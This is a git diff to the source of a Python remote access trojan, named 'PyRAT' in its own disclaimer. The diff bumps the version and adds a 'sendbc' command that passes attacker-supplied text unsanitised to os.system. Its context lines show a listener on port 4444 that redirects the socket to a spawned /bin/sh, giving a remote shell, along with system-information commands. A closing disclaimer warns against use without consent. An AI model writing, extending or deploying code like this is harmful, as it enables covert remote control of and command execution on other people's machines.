@@ -11,7 +11,7 @@ import pty
 import platform
 from cryptography.fernet import Fernet
 
-ver = "1.1"
+ver = "1.2"
 def create_conn(host,port,ver):
     while True:
         # Create socket
@@ -35,7 +35,8 @@ Help Menu:
 help  | Help menu.
 exit  | Break connection but keep running.
 close | Close connection and stop.
-    
+
+sendbc  | Send broadcast notification.
 sysinfo | System Information.
 pyinfo  | Python Information.
 shell   | Spawn shell.
@@ -69,6 +70,9 @@ cmd> """
                     os.getenv(str(port))
                     [os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
                     pty.spawn("/bin/sh")
+                elif datasplit[0] == "sendbc":
+                    bcm = "wall "+ " ".join(datasplit[1:])
+                    os.system(bcm)
                 elif data == "sysinfo\n":
                     mach = platform.machine()
                     sys = platform.system()
@@ -171,6 +175,7 @@ cmd> """.format(pyver,pycompiler,pybuild,pybranch)
 host = "0.0.0.0"
 port = 4444
 create_conn(host,port,ver)
+
 
 # Disclaimer
 # Usage of this malware (PyRAT) for attack targets without prior mutual consent is illegal. 
